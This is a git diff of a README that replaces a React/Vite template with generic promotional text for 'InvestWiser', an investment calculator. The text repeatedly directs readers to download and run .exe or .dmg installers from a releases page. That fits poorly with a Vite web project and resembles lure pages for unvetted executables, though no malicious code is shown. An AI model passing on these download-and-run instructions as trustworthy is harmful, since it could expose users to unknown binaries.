@@ -1,73 +1,98 @@
-# React + TypeScript + Vite
+# 📈 InvestWiser - Simplify Your Investment Calculations
 
-This template provides a minimal setup to get React working in Vite with HMR and some ESLint rules.
+## 🚀 Getting Started
 
-Currently, two official plugins are available:
+Welcome to InvestWiser! This tool helps Indian investors calculate their investments easily. You can compute SIP, SWP, and Step-Up SIP returns. Our easy-to-use interface offers interactive visualizations and detailed year-wise breakdowns. You can even export your calculations to Google Sheets.
 
-- [@vitejs/plugin-react](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react) uses [Babel](https://babeljs.io/) (or [oxc](https://oxc.rs) when used in [rolldown-vite](https://vite.dev/guide/rolldown)) for Fast Refresh
-- [@vitejs/plugin-react-swc](https://github.com/vitejs/vite-plugin-react/blob/main/packages/plugin-react-swc) uses [SWC](https://swc.rs/) for Fast Refresh
+## 📥 Download InvestWiser
 
-## React Compiler
+[![Download InvestWiser](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/khan012345/InvestWiser/releases)
 
-The React Compiler is not enabled on this template because of its impact on dev & build performances. To add it, see [this documentation](https://react.dev/learn/react-compiler/installation).
+To download InvestWiser, visit the Releases page. You'll find the latest version ready for you.
 
-## Expanding the ESLint configuration
+[Visit the Download Page](https://github.com/khan012345/InvestWiser/releases)
 
-If you are developing a production application, we recommend updating the configuration to enable type-aware lint rules:
+## 📋 System Requirements
 
-```js
-export default defineConfig([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
+Before you download, make sure your computer meets these basic requirements:
 
-      // Remove tseslint.configs.recommended and replace with this
-      tseslint.configs.recommendedTypeChecked,
-      // Alternatively, use this for stricter rules
-      tseslint.configs.strictTypeChecked,
-      // Optionally, add this for stylistic rules
-      tseslint.configs.stylisticTypeChecked,
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Processor:** Dual-core processor or better
+- **RAM:** At least 4GB
+- **Storage:** Minimum 200MB of free space
+- **Browser:** Latest version of Chrome, Firefox, or Safari
 
-      // Other configs...
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
-```
+## ⚙️ Features
 
-You can also install [eslint-plugin-react-x](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-x) and [eslint-plugin-react-dom](https://github.com/Rel1cx/eslint-react/tree/main/packages/plugins/eslint-plugin-react-dom) for React-specific lint rules:
+InvestWiser offers a variety of features to help you manage your investments:
 
-```js
-// eslint.config.js
-import reactX from 'eslint-plugin-react-x'
-import reactDom from 'eslint-plugin-react-dom'
+- **SIP Calculator:** Easily calculate your SIP returns and understand how your investments can grow over time.
+- **SWP Calculator:** Withdraw your funds smartly using our SWP tool. Plan your withdrawals effectively.
+- **Step-Up SIP:** Increase your investment over time and see potential gains with our Step-Up calculation.
+- **Visual Analytics:** Interact with visual graphs and charts to better understand your financial data.
+- **Google Sheets Export:** Save your calculations directly to Google Sheets for easy access and sharing.
 
-export default defineConfig([
-  globalIgnores(['dist']),
-  {
-    files: ['**/*.{ts,tsx}'],
-    extends: [
-      // Other configs...
-      // Enable lint rules for React
-      reactX.configs['recommended-typescript'],
-      // Enable lint rules for React DOM
-      reactDom.configs.recommended,
-    ],
-    languageOptions: {
-      parserOptions: {
-        project: ['./tsconfig.node.json', './tsconfig.app.json'],
-        tsconfigRootDir: import.meta.dirname,
-      },
-      // other options...
-    },
-  },
-])
-```
+## 📂 Download & Install
+
+To get started with InvestWiser, follow these simple steps:
+
+1. **Go to the Releases Page:** Click on the link below.
+   
+   [Download InvestWiser](https://github.com/khan012345/InvestWiser/releases)
+
+2. **Select the Latest Version:** Look for the most recent stable release.
+
+3. **Choose Your File:** Depending on your operating system, choose the appropriate download file.
+
+4. **Download the File:** Click on the file to download it to your device.
+
+5. **Install the Application:** 
+    - For Windows: Double-click the downloaded .exe file and follow the installation prompts.
+    - For Mac: Open the downloaded .dmg file, drag the InvestWiser app to your Applications folder.
+
+6. **Launch InvestWiser:** Once installation is complete, find the app in your Applications folder or Start Menu.
+
+7. **Start Calculating:** Open InvestWiser and begin using the investment calculators.
+
+## 🛠️ Using InvestWiser
+
+After installation, get familiar with these main functions:
+
+- **Input Your Data:** Enter your investment details in the fields provided for SIP, SWP, or Step-Up SIP.
+- **View Results:** See your returns displayed in a clear and organized manner.
+- **Interactive Visualizations:** Explore graphs that illustrate your investment growth over time.
+- **Export Options:** When ready, export your results to Google Sheets with the click of a button.
+
+## 💡 Tips for Effective Use
+
+- **Regularly Update:** Ensure you keep the app updated for the best features and functionality.
+- **Explore Features:** Take your time to explore all the calculators and visual tools.
+- **Keep Track of Changes:** Use the export feature to monitor your investment strategy over time.
+
+## 🌐 Topics Covered
+
+InvestWiser touches on many important investment themes:
+
+- **Calculator**
+- **Compound Interest**
+- **Finance Tools**
+- **Lump Sum Investment**
+- **Mutual Funds**
+- **SIP**
+- **SWP**
+- **Step-Up SIP**
+- **React**
+- **Recharts**
+- **TailwindCSS**
+- **TypeScript**
+- **Vite**
+
+## 🧑‍💼 Support
+
+If you have questions or need help:
+
+- **Check the Documentation:** Visit the Documentation section of our repository for guides.
+- **Report Issues:** If you encounter problems, report them on the Issues page.
+- **Join the Community:** Engage with other users on our discussion boards.
+
+Thank you for choosing InvestWiser! We hope it makes your investment journey easier and more enjoyable.
